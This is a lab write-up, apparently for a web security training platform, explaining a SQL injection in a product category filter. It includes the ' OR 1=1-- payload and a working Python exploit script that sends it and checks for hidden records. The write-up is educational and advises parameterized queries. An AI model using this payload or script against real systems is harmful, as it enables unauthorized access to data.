## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

<div style="text-align: justify;">
  In this lab, I explored how a simple SQL injection (SQLi) vulnerability in the `WHERE` clause of an SQL query can lead to information disclosure. By injecting a classic `' OR 1=1--` payload into a URL parameter, I was able to bypass category filters and extract all records from the database. Despite its simplicity, this technique is highly effective when user inputs are not properly sanitized.

  This exercise reinforced how even the most basic SQLi attack vectors can severely undermine application logic, especially in web apps that rely on direct input embedding into database queries. It’s a reminder that developers must use parameterized queries or ORM-based access to prevent such issues.

<Aside>
  Start Burp Suite before running the script — it uses a proxy for visibility.

### How Exploit Works
- The app filters products based on the `category` parameter in the URL.
- This value is directly embedded into the SQL `WHERE` clause.
- No sanitization or parameterization is performed.
- The injected payload `' OR 1=1--` forces the condition to always evaluate true.
- The server responds with **all** products in the database.
- The script confirms success by searching for a known product name in the response.

<Aside>
  You may need to update the product name `"Folding Gadgets"` in the script, depending on the lab instance.

### Usage

```cmd
python3 exploit.py https://<your-lab-id>.web-security-academy.net
```

### Exploit

```python title="exploit.py"
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Folding Gadgets" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = "'+OR+1=1--"
    except IndexError:
        print("[-] Usage: %s <url>" %sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
        
    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful")
```
